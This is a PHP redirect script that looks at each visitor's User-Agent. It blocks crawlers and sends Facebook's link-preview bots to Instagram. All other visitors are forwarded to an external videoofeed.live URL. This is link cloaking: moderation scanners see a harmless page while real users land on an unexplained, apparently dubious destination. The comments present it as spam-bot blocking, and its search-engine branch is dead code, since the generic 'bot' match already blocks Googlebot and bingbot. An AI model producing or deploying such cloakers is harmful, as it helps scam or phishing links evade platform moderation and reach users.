<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// List of known spam bots (add more if necessary)
$spamBots = [
    'bot', 'spider', 'crawler', 'nutch', 'scrapy', 'yandex', 'semalt', 'slurp', 'baidu', 'dotbot'
];

// Loop through known spam bots and block them
foreach ($spamBots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        // Optionally log or take actions before blocking
        header("HTTP/1.1 403 Forbidden");
        exit; // Block the request
    }
}

// Facebook bot detection
if (stripos($userAgent, 'facebookexternalhit') !== false || stripos($userAgent, 'Facebot') !== false) {
    // Redirect Facebook bots to Instagram
    header("Location: https://www.instagram.com");
    exit; // Stop further execution
}

// Optional: Let search engines like Googlebot and Bingbot in (default behavior)
// You can also log or customize based on their agent
if (stripos($userAgent, 'Googlebot') !== false || stripos($userAgent, 'bingbot') !== false) {
    // Optionally do something for search engine bots
    // e.g., log, serve SEO version, etc.
}

// For all real users or other bots, redirect to your custom URL
header("Location: https://videoofeed.live/public/U8TdYk");
exit; // Stop further execution
?>

